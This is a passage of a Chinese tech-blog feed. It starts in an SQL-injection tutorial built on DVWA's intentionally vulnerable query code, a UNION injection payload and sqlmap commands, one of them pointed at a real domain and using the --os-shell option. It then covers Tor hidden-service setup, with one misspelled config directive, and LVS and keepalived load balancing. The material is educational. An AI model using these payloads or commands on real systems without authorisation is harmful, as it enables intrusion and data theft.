SQLITE:</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sqlite_db_connection</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#$sqlite_db_connection = new SQLite3($_DVWA[&#x27;SQLITE_DB&#x27;]);</span></span><br><span class="line"><span class="comment">#$sqlite_db_connection-&gt;enableExceptions(true);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">#print $query;</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$results</span> = <span class="variable">$sqlite_db_connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Caught exception: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$results</span>) &#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$results</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line"><span class="comment">// Get values</span></span><br><span class="line"><span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line"><span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Error in fetch &quot;</span>.<span class="variable">$sqlite_db</span>-&gt;<span class="title function_ invoke__">lastErrorMsg</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中我们可以发现参数id是由用户传递的,并且参数id并没有经过服务器的任何处理直接插入到sql语句中执行,由于id是由用户 传递的,因此id参数对于用户来说可控,因此用户可以通过构造参数id实现自己想执行的sql语句</p><p>比如如果用户输入1’ and 1&#x3D;2 union select version();–+</p><p>这个时候拼凑成要执行的sql语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,version();<span class="comment">--+&#x27;</span></span><br></pre></td></tr></table></figure><p>由于1&#x3D;2为假,因此这条sql语句执行的结果其实是我们构造的sql语句select 1, version()(一个mysql函数,返回数据库的版本信息)的执行结果,因此最终服务器会返回1,和数据库的版本信息。</p><h3 id="3-sql注入类型"><a href="#3-sql注入类型" class="headerlink" title="3.sql注入类型"></a>3.sql注入类型</h3><h5 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1.报错注入"></a>1.报错注入</h5><p>  注入过程中只有错误时目标服务器才有回显</p><h5 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h5><p>  注入过程中只会出现正确和错误两种回显,并不会回显查询数据</p><h5 id="3-延时注入"><a href="#3-延时注入" class="headerlink" title="3.延时注入"></a>3.延时注入</h5><p>  注入过程中怎么样都是正确的,但是在执行延时函数的时候能明显发现目标服务器回应时间出现了明显的变化。</p><h5 id="4-宽字节注入"><a href="#4-宽字节注入" class="headerlink" title="4.宽字节注入"></a>4.宽字节注入</h5><p>  由于编码问题,注入库在处理指定的输入参数使用了gbk编码,导致用户输入的参数和闭合字符被当成一个字符处理。</p><h5 id="5-http-header注入"><a href="#5-http-header注入" class="headerlink" title="5.http-header注入"></a>5.http-header注入</h5><p>  注入位置在http请求头(如User-Agent,Cookie等)中</p><h3 id="4-sql注入的步骤"><a href="#4-sql注入的步骤" class="headerlink" title="4.sql注入的步骤"></a>4.sql注入的步骤</h3><p>1.测试sql注入的位置</p><p>2.确定闭合方式</p><p>3.探测回显位置</p><p>4.获取数据库敏感信息</p><h3 id="5-sqlmap"><a href="#5-sqlmap" class="headerlink" title="5.sqlmap"></a>5.sqlmap</h3><p>sqlmap是一个自动化的sql注入漏洞探测工具,由python开发,可以自行指定探测位置,以及设置相关参数。</p><h5 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;https://www.baidu.com/index.php?id=1&quot;</span> -p <span class="string">&quot;id&quot;</span> --proxy http://localhost:1080 --banner</span><br><span class="line">-u 指定探测的url</span><br><span class="line">-p 指定探测的参数</span><br><span class="line">--banner 探测目标数据库的版本</span><br><span class="line">--dbs 探测目标数据库的所有数据库</span><br><span class="line">--tables 探测指定目标数据库的所有的表</span><br><span class="line">--columns 探测指定目标数据库指定表的指定列</span><br><span class="line">--os-shell 获取目标服务器的shell</span><br><span class="line">--sql-shell 获取目标服务器数据库的shell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tor的技术原理</title>
      <link href="/2022/09/04/Tor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"/>
      <url>/2022/09/04/Tor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Tor的技术原理"><a href="#Tor的技术原理" class="headerlink" title="Tor的技术原理"></a>Tor的技术原理</h1><h3 id="1-Tor的历史"><a href="#1-Tor的历史" class="headerlink" title="1.Tor的历史"></a>1.Tor的历史</h3><p>1995年，美国海军研究实验室的科学家开始开发一套匿名系统，可以避免人们在互联网上的行迹被追踪到。由于在该系统中，数据被层层密码保护，这个技术被称为叫作“洋葱路由”(tor)。</p><h3 id="2-Tor如何实现匿名访问"><a href="#2-Tor如何实现匿名访问" class="headerlink" title="2.Tor如何实现匿名访问?"></a>2.Tor如何实现匿名访问?</h3><p><strong>Tor客户端匿名原理</strong>:</p><p>Tor是一个三重代理,客户端在接入tor网络的时候,Tor客户端会首先连接tor目录服务器通信获得全球活动的中继节点,然后从中选取三个作为节点的相关信息(ip地址,公钥,出口策略,带宽,在线时间)组成电路(cirdcuit),这三个节点分别叫入口节点、中继节点、出口节点。用户的流量在发送到暗网服务器的时候会依次经过这三个节点,只有最后一个节点知道目标服务器,第一个节点知道自身的ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">Client--&gt;GuardRelay</span><br><span class="line">GuardRelay--&gt;MiddleRelay</span><br><span class="line">MiddleRelay--&gt;ExitRelay</span><br><span class="line">ExitRelay--&gt;RealServer</span><br></pre></td></tr></table></figure><p><strong>暗网服务器匿名原理</strong>:</p><p>服务器在接受客户端请求的时候,客户端并不是直接访问目标站点服务器,而是选取一个汇合节点进行通信,客户端和目标站点都是通过汇合节点进行数据请求的收发,而且服务器在和汇合节点通信的时候也是通过tor链路进行通信的。</p><p><strong>客户端访问暗网网站的过程</strong>:</p><ul><li>1.客户端通过tor链路和暗网的分布式散列表建立连接,开始查询目标网站的描述符,获得目标服务器的介绍节点</li><li>2.客户端随机选取一个节点作为汇合点(客户端和汇合点之间相隔两个节点),并生成一个一次性的cookie,并在汇合节点留下cookie将汇合点的ip地址和cookie加密(使用目标服务器的公钥)发送给介绍节点</li><li>3.服务器收到密文数据包后,用自己的私钥解密数据包,获得汇合点的ip地址,</li><li>4.服务器通过tor链路连接至汇合节点,并比对cookie,如果比对成功,客户端和目标站点建立通信</li></ul><p>至此客户端和目标站点中间隔了6个节点,分别是客户端入口节点、客户端中继节点、汇合点、服务器出口节点、服务器中继节点、服务器入口节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">Client--&gt;ClientGuardRelay</span><br><span class="line">ClientGuardRelay--&gt;ClientMiddleRelay;</span><br><span class="line">ClientMiddleRelay--&gt;ClientExitRelay;</span><br><span class="line"></span><br><span class="line">Server--&gt;ServerGuardRelay</span><br><span class="line">ServerGuardRelay--&gt;ServerMiddleRelay;</span><br><span class="line">ServerMiddleRelay--&gt;ServerExitRelay</span><br></pre></td></tr></table></figure><p><strong>Tor数据包加密过程</strong></p><p>首先客户端会选取三个作为节点作为通信的中继节点,并开始和这三个节点开始协商密钥对,每次发送数据时依次使用ExitNode的公钥,MiddleNode的公钥,GuardRelay的公钥对数据包进行加密。</p><h3 id="3-如何搭建一个暗网网站"><a href="#3-如何搭建一个暗网网站" class="headerlink" title="3.如何搭建一个暗网网站?"></a>3.如何搭建一个暗网网站?</h3><p>安装tor</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install tor</span><br></pre></td></tr></table></figure><p>编辑tor配置文件&#x2F;etc&#x2F;tor&#x2F;torrc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HiddenServiceDir /var/lib/tor/hidden_service/</span><br><span class="line">HiddenServicePort 80 127.0.0.1:10000 <span class="comment">#表示对外映射一个虚拟端口80提供服务,并将本地10000端口映射到80端口</span></span><br><span class="line">Socks5Proxy 127.0.0.0:1080 <span class="comment">#使用前置代理,用代理连接至tor网络</span></span><br><span class="line">HiddenServiceNumInstrductionPoints 10 <span class="comment">#最大数量的介绍节点</span></span><br><span class="line">HiddenServiceVersion 3<span class="comment">#使用第三代洋葱地址</span></span><br><span class="line">SOCKSPolicy accept 0.0.0.0 <span class="comment">#控制访问的客户端的ip地址段</span></span><br></pre></td></tr></table></figure><p>启动tor服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start tor.service</span><br></pre></td></tr></table></figure><p>启动后目录&#x2F;var&#x2F;lib&#x2F;tor&#x2F;hidden_service下会生成两个文件hostname和private_key,分别是暗网的主机名和私钥,公钥就是暗网主机名</p><p>参考:</p><p><a href="https://2047.one/t/9204">https://2047.one/t/9204</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>负载均衡解决方案</title>
      <link href="/2022/08/23/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2022/08/23/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h1 id="负载均衡解决方案"><a href="#负载均衡解决方案" class="headerlink" title="负载均衡解决方案"></a>负载均衡解决方案</h1><p>常用的负载均衡解决方案有一下几种</p><ul><li>1.LVS</li><li>2.Haproxy</li><li>3.Nginx</li></ul><h3 id="1-LVS"><a href="#1-LVS" class="headerlink" title="1.LVS"></a>1.LVS</h3><p>LVS(Linux Virtual Server),Linux虚拟服务器,是一个虚拟的服务器集群系统,常用于服务器负载均衡(基于四层的端口转发),lvs基于linux netfilter模块,因此效率十分高效。</p><h5 id="1-LVS主要组成部分"><a href="#1-LVS主要组成部分" class="headerlink" title="1.LVS主要组成部分:"></a>1.LVS主要组成部分:</h5><ul><li>1.负载均衡器</li><li>2.服务器池</li><li>3.共享存储</li></ul><h5 id="2-LVS负载均衡方式"><a href="#2-LVS负载均衡方式" class="headerlink" title="2.LVS负载均衡方式"></a>2.LVS负载均衡方式</h5><p>**VS&#x2F;NAT(网络地址转换模式) **</p><p>前提条件:</p><p>实际的服务器的网关要指向负载均衡器。</p><p>请求响应过程:</p><p>负载均衡器绑定一个虚拟的ip地址,客户端访问虚拟ip地址后,负载均衡器将请求的目标地址进行目标地址转换(DNAT),将请求分发给实际的服务器,服务器对请求进行响应后,由于负载均衡器是实际服务器的网关,这时,负载均衡器对响应包进行源地址转换(SNAT)。</p><p><strong>VS&#x2F;DR(直接路由模式)</strong></p><p>前提条件:</p><p>负载均衡器和实际的服务器要绑定同一个虚拟ip,并且要在同一个内部网络下。</p><p>请求响应过程:</p><p>客户端访问访问虚拟ip,负载均衡器收到请求,将请求的mac地址修改实际服务器的mac地址,导致请求发送给实际的服务器,由于负载均衡器和实际的服务器绑定了同一个虚拟ip地址,实际的服务器可以直接对客户端进行响应。</p><p><strong>VS&#x2F;TUN(隧道模式)</strong></p><p>前提条件:</p><p>调度器和实际的服务器都要绑定同一个虚拟ip地址,并且调度器和后端服务器要支持隧道技术,调度器和后端服务器可以在任意网络环境下。</p><p>请求响应过程:</p><p>负载均衡器接受到了客户端的请求后将原始的请求包加上一层ip头,以自己的ip地址为源ip地址,目标地址为实际的服务器节点ip地址,发送给目标服务器,目标服务器收到报文后,拆开第一个ip包头,发现里面的ip包头的目标ip为vip,由于实际的服务器都绑定了vip,因此他会处理这个请求报文。</p><h5 id="3-LVS负载均衡算法"><a href="#3-LVS负载均衡算法" class="headerlink" title="3.LVS负载均衡算法"></a>3.LVS负载均衡算法</h5><p><strong>1.RoundRobin(轮询调度)</strong></p><p>以轮流的方式选择实际的服务器节点</p><p><strong>2.Weitht RoundRobin(加权轮询调度)</strong></p><p>权重高的服务器节点更容易接受到请求,权重少的服务器接受更少的连接请求</p><p><strong>3.Least Connections(最小连接调度)</strong></p><p>将请求分发给实际连接数最少的服务器节点,服务器节点当接受到一个新的请求,则连接数+1,如果断开一个链接则连接数-1,一般用于长连接服务请求调度</p><p><strong>4.Weight Least Connections(加权最小连接调度)</strong></p><p>连接请求的分配和服务器节点的连接数和权重成正比,可以使得服务器在接受请求时,当前服务器的接收请求数和其权值成正比</p><p><strong>5.Locality-Based Least Connections(基于局部性的最少链接)</strong></p><p>针对请求报文的ip地址负载均衡调度,主要用于cache集群系统,目标是在服务器负载基本平衡的前提下,将相同目标ip地址的请求调度到同一台服务器,如果请求的服务器过载,</p><p><strong>6.Locality-Based Least Connections with Replication( 带复制的基于局部性最少链接)</strong></p><p>“带复制的基于局部性最少链接”调度算法也是针对目标IP地址的负载均衡，目前主要用于Cache集群系统。它与LBLC算法的不同之处是它要维护从一个目标IP地址到一组服务器的映射，而LBLC算法维护从一个目标IP地址到一台服务器的映射。该算法根据请求的目标IP地址找出该目标IP地址对应的服务器组，按”最小连接”原则从服务器组中选出一台服务器，若服务器没有超载，将请求发送到该服务器，若服务器超载；则按”最小连接”原则从这个集群中选出一台服务器，将该服务器加入到服务器组中，将请求发送到该服务器。同时，当该服务器组有一段时间没有被修改，将最忙的服务器从服务器组中删除，以降低复制的程度</p><p><strong>7.Destination Hashing(目标地址散列)</strong></p><p>“目标地址散列”调度算法根据请求的目标IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的且未超载，将请求发送到该服务器，否则返回空。</p><p><strong>8.Source Hashing(源地址散列)</strong></p><p>“源地址散列”调度算法根据请求的源IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的且未超载，将请求发送到该服务器，否则返回空。</p><h5 id="4-Keepalived"><a href="#4-Keepalived" class="headerlink" title="4.Keepalived"></a>4.Keepalived</h5><p>keepalived是为lvs服务的,用来自动配置lvs集群</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装keepalived组件</span></span><br><span class="line">yum install -y keepalived</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line">   notification_email &#123;</span><br><span class="line">     acassen@firewall.loc</span><br><span class="line">     failover@firewall.loc</span><br><span class="line">     sysadmin@firewall.loc</span><br><span class="line">   &#125;</span><br><span class="line">   #配置告警发送邮件的邮件服务器相关信息</span><br><span class="line">   notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class="line">   smtp_server 192.168.200.1</span><br><span class="line">   smtp_connect_timeout 30</span><br><span class="line">   router_id LVS_DEVEL</span><br><span class="line">   vrrp_skip_check_adv_addr</span><br><span class="line">   vrrp_strict</span><br><span class="line">   vrrp_iptables #取消自动生成iptables规则</span><br><span class="line">   vrrp_garp_interval 0</span><br><span class="line">   vrrp_gna_interval 0</span><br><span class="line">&#125;</span><br><span class="line">#实例</span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state MASTER</span><br><span class="line">    interface ens33</span><br><span class="line">    #集群id号</span><br><span class="line">    virtual_router_id 51</span><br><span class="line">    #优先级</span><br><span class="line">    priority 100</span><br><span class="line">    advert_int 1</span><br><span class="line">    #验证信息</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line">    #虚拟服务器ip地址,便于服务器故障时将虚拟ip地址漂移给其他的从节点</span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.245.188/24</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#虚拟服务器集群(用于vrrp实例调用)</span><br><span class="line">virtual_server 192.168.200.100 443 &#123;</span><br><span class="line">    delay_loop 6</span><br><span class="line">    lb_algo rr</span><br><span class="line">    #lvs调度类型</span><br><span class="line">    lb_kind DR</span><br><span class="line">    persistence_timeout 60</span><br><span class="line">    protocol TCP</span><br><span class="line">#后端服务器的ip和端口号</span><br><span class="line">    real_server 192.168.201.100 443 &#123;</span><br><span class="line">        weight 1</span><br><span class="line">        #健康检查(SSL_GET/TCP/SSL_GET)</span><br><span class="line">        SSL_GET &#123;</span><br><span class="line">            url &#123;</span><br><span class="line">              path /</span><br><span class="line">              digest ff20ad2481f97b1754ef3e12ecd3a9cc</span><br><span class="line">            &#125;</span><br><span class="line">            url &#123;</span><br><span class="line">              path /mrtg/</span><br><span class="line">              digest 9b3a0c85a887a256d6939da88aabd8cd #返回页面的md5值</span><br><span class="line">            &#125;</span><br><span class="line">            connect_timeout 3</span><br><span class="line">            nb_get_retry 3</span><br><span class="line">            delay_before_retry 3</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_server 10.10.10.2 1358 &#123;</span><br><span class="line">    delay_loop 6</span><br><span class="line">    lb_algo rr </span><br><span class="line">    lb_kind NAT</span><br><span class="line">    persistence_timeout 50</span><br><span class="line">    protocol TCP</span><br><span class="line"></span><br><span class="line">    sorry_server 192.168.200.200 1358</span><br><span class="line"></span><br><span class="line">    real_server 192.168.200.2 1358 &#123;</span><br><span class="line">        weight 1</span><br><span class="line">        HTTP_GET &#123;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl2/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl3/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            connect_timeout 3</span><br><span class="line">            nb_get_retry 3</span><br><span class="line">            delay_before_retry 3</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    real_server 192.168.200.3 1358 &#123;</span><br><span class="line">        weight 1</span><br><span class="line">        HTTP_GET &#123;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334c</span><br><span class="line">            &#125;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl2/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334c</span><br><span class="line">            &#125;</span><br><span class="line">            connect_timeout 3</span><br><span class="line">            nb_get_retry 3</span><br><span class="line">            delay_before_retry 3</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_server 10.10.10.3 1358 &#123;</span><br><span class="line">    delay_loop 3</span><br><span class="line">    lb_algo rr </span><br><span class="line">    lb_kind NAT</span><br><span class="line">    persistence_timeout 50</span><br><span class="line">    protocol TCP</span><br><span class="line"></span><br><span class="line">    real_server 192.168.200.4 1358 &#123;</span><br><span class="line">        weight 1</span><br><span class="line">        HTTP_GET &#123;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl2/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl3/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            connect_timeout 3</span><br><span class="line">            nb_get_retry 3</span><br><span class="line">            delay_before_retry 3</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    real_server 192.168.200.5 1358 &#123;</span><br><span class="line">        weight 1</span><br><span class="line">        HTTP_GET &#123;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl2/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            url &#123; </span><br><span class="line">              path /testurl3/test.jsp</span><br><span class="line">              digest 640205b7b0fc66c1ea91c463fac6334d</span><br><span class="line">            &#125;</span><br><span class="line">            connect_timeout 3</span><br><span class="line">            nb_get_retry 3</span><br><span class="line">            delay_before_retry 3</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>real server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_announce</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_announce</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore</span><br><span class="line"><span class="comment">#添加虚拟ip地址s</span></span><br><span class="line">ip addr add <span class="variable">$VIP</span>/PREFIX dev lo label lo:1</span><br></pre></td></tr></table></figure><p>调度器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加虚拟ip地址</span></span><br><span class="line">ip addr add <span class="variable">$VIP</span>/PREFIX dev ens33 label ens33:1</span><br><span class="line"><span class="comment">#配置路由</span></span><br><span class="line">ip route add <span class="variable">$VIP</span> dev ens33 ens33:1</span><br></pre></td></tr></table></figure><h3 id="2-Haproxy"><a href="#2-Haproxy" class="headerlink" title="2.Haproxy"></a>2.Haproxy</h3><h5 id="1-Haproxy是什么？"><a href="#1-Haproxy是什么？" class="headerlink" title="1.Haproxy是什么？"></a>1.Haproxy是什么？</h5><p>Haproxy是一款提供高可用性,基于4层和7层负载均衡的专业应用代理服务器。</p><h5 id="2-Haproxy的功能"><a href="#2-Haproxy的功能" class="headerlink" 